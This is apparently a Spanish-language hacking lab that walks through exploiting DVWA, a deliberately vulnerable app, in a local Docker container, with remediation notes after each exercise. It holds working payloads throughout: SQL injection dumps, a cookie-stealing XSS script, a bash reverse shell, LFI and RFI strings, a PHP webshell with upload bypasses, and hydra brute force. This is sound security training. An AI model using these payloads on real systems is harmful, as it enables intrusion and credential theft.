---
title: "Lab 02 - Explotacion Web (OWASP Top 10)"
tags:
  - hacking
  - laboratorio
  - explotacion-web
tipo: laboratorio
certificacion: hacking-vault
---

# Lab 02 - Explotacion Web (OWASP Top 10)

**Dificultad:** Media | **Duracion estimada:** 4-5 horas | **Herramientas:** DVWA, Burp Suite, sqlmap, hydra

## Objetivo

Practicar las vulnerabilidades web mas comunes del OWASP Top 10 contra DVWA (Damn Vulnerable Web Application). Por cada vulnerabilidad, realizaras la explotacion manual, luego con herramientas automatizadas, y finalmente documentaras la remediacion.

> **Advertencia:** DVWA es una aplicacion deliberadamente vulnerable diseñada solo para fines educativos. Nunca apliques estas tecnicas contra aplicaciones en produccion sin autorizacion explicita por escrito. El acceso no autorizado a sistemas es un delito penal.

---

## Preparacion del Entorno

### Desplegar DVWA con Docker

1. Despliega DVWA con Docker Compose:

```bash
mkdir -p ~/labs/lab02-web && cd ~/labs/lab02-web

cat > docker-compose.yml << 'EOF'
version: '3'
services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    restart: unless-stopped
EOF

docker compose up -d
```

2. Accede a DVWA en el navegador: `http://localhost:8080`
3. Inicia sesion con las credenciales por defecto: `admin` / `password`
4. Ve a **DVWA Security** y configura el nivel en **Low** para empezar
5. Pulsa **Create / Reset Database** si es la primera vez

### Configurar Burp Suite

6. Abre Burp Suite Community Edition
7. Configura el proxy del navegador en `127.0.0.1:8080` (usa FoxyProxy)
8. Verifica que interceptas peticiones hacia DVWA

---

## Ejercicio 1: SQL Injection

### Explotacion manual

9. Navega a **SQL Injection** en DVWA
10. Introduce un ID normal para ver el comportamiento esperado:

```
1
```

11. Prueba una inyeccion basica para detectar la vulnerabilidad:

```
1' OR '1'='1
```

12. Extrae informacion de la base de datos paso a paso:

```sql
-- Determinar numero de columnas
1' ORDER BY 1#
1' ORDER BY 2#
1' ORDER BY 3#   -- Este falla: hay 2 columnas

-- Extraer nombre de la base de datos
1' UNION SELECT database(), user()#

-- Listar tablas
1' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()#

-- Extraer columnas de la tabla users
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'#

-- Extraer usuarios y contraseñas
1' UNION SELECT user, password FROM users#
```

### Explotacion con sqlmap

13. Captura la peticion vulnerable con Burp Suite y guardala en un archivo:

```bash
# Alternativa: usar sqlmap directamente con la URL y cookie
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<TU_SESION>;security=low" \
  --dbs
```

14. Extrae las tablas y datos:

```bash
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<TU_SESION>;security=low" \
  -D dvwa -T users --dump
```

### Remediacion

- Usar consultas parametrizadas (prepared statements)
- Validar y sanear toda entrada del usuario
- Aplicar el principio de minimo privilegio a las cuentas de base de datos

---

## Ejercicio 2: Cross-Site Scripting (XSS)

### XSS Reflejado

15. Navega a **XSS (Reflected)** en DVWA
16. Introduce un payload basico:

```html
<script>alert('XSS')</script>
```

17. Prueba un payload que robe cookies:

```html
<script>document.location='http://TU_IP:9999/?c='+document.cookie</script>
```

18. Levanta un listener para capturar la cookie:

```bash
# En tu maquina atacante
python3 -m http.server 9999
```

### XSS Almacenado

19. Navega a **XSS (Stored)** en DVWA
20. En el campo de mensaje del libro de visitas, introduce:

```html
<script>alert('XSS Almacenado')</script>
```

21. Observa que el script se ejecuta cada vez que alguien visita la pagina.

### Remediacion

- Codificar la salida HTML con `htmlspecialchars()` o equivalente
- Implementar Content Security Policy (CSP) en las cabeceras HTTP
- Validar entrada en el servidor, nunca confiar solo en el cliente

---

## Ejercicio 3: Command Injection

22. Navega a **Command Injection** en DVWA
23. Introduce una IP normal para ver el comportamiento esperado:

```
127.0.0.1
```

24. Encadena un comando del sistema:

```bash
127.0.0.1; whoami
127.0.0.1; cat /etc/passwd
127.0.0.1 && ls -la /var/www/html
```

25. Prueba obtener una reverse shell:

```bash
127.0.0.1; bash -c 'bash -i >& /dev/tcp/TU_IP/4444 0>&1'
```

26. Prepara el listener antes de enviar:

```bash
nc -lvnp 4444
```

### Remediacion

- Nunca pasar entrada del usuario directamente a funciones del sistema
- Usar listas blancas de caracteres permitidos
- Emplear funciones especificas en lugar de llamadas al shell (por ejemplo, `inet_aton()` para validar IPs)

---

## Ejercicio 4: File Inclusion (LFI)

27. Navega a **File Inclusion** en DVWA
28. Observa la URL: `?page=include.php`
29. Intenta leer archivos del sistema:

```
?page=../../../../../../etc/passwd
?page=../../../../../../etc/shadow
```

30. Intenta leer el codigo fuente de la aplicacion:

```
?page=php://filter/convert.base64-encode/resource=../../../var/www/html/config/config.inc.php
```

31. Decodifica el resultado:

```bash
echo "<BASE64_OBTENIDO>" | base64 -d
```

32. Si hay inclusion remota habilitada (RFI), prueba:

```
?page=http://TU_IP/shell.php
```

### Remediacion

- Usar listas blancas de archivos permitidos
- Desactivar `allow_url_include` en php.ini
- No pasar nombres de archivo como parametros del usuario

---

## Ejercicio 5: File Upload

33. Navega a **File Upload** en DVWA
34. Crea un webshell PHP simple:

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

35. Sube el archivo `shell.php` directamente (nivel Low lo permite)
36. Accede al webshell:

```
http://localhost:8080/hackable/uploads/shell.php?cmd=whoami
http://localhost:8080/hackable/uploads/shell.php?cmd=cat+/etc/passwd
```

37. Para niveles de seguridad mas altos, prueba bypass de extension:

```bash
# Doble extension
cp shell.php shell.php.jpg

# Null byte (versiones antiguas de PHP)
cp shell.php shell.php%00.jpg

# Cambiar Content-Type en Burp Suite a image/jpeg
```

### Remediacion

- Validar tipo MIME y extension en el servidor
- Almacenar archivos subidos fuera del webroot
- Renombrar archivos subidos con nombres aleatorios
- Deshabilitar ejecucion de scripts en directorios de subida

---

## Ejercicio 6: Brute Force

38. Navega a **Brute Force** en DVWA
39. Usa hydra para atacar el formulario de login:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  localhost -s 8080 \
  http-get-form \
  "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect:H=Cookie: PHPSESSID=<TU_SESION>;security=low"
```

40. Alternativa con Burp Suite Intruder:
    - Captura la peticion de login en Burp
    - Envia a Intruder (Ctrl+I)
    - Marca el campo password como posicion
    - Carga una lista de contraseñas como payload
    - Observa la longitud de respuesta diferente para la contraseña correcta

### Remediacion

- Implementar limites de intentos (rate limiting) y bloqueo temporal
- Usar CAPTCHA despues de varios intentos fallidos
- Implementar autenticacion multifactor (MFA)
- Monitorizar y alertar sobre intentos de fuerza bruta

---

## Resumen de Vulnerabilidades y Remediaciones

| Vulnerabilidad | Vector de ataque | Remediacion principal |
|---------------|-----------------|----------------------|
| SQL Injection | Entrada no saneada en consultas SQL | Prepared statements |
| XSS | Salida no codificada en HTML | htmlspecialchars() + CSP |
| Command Injection | Entrada pasada a funciones del sistema | Listas blancas, no usar shell |
| LFI/RFI | Parametros de archivo controlados por usuario | Listas blancas de archivos |
| File Upload | Validacion insuficiente de archivos | Validar tipo, extension, almacenar fuera del webroot |
| Brute Force | Sin limites de intentos | Rate limiting, MFA, CAPTCHA |

---

## Limpieza

41. Detener y eliminar el contenedor:

```bash
cd ~/labs/lab02-web
docker compose down
```

---

## Siguiente Lab

Continua con [Lab 03 - Escalada de Privilegios](lab-03-escalada-privilegios.md) para aprender a escalar desde un acceso inicial hasta root.
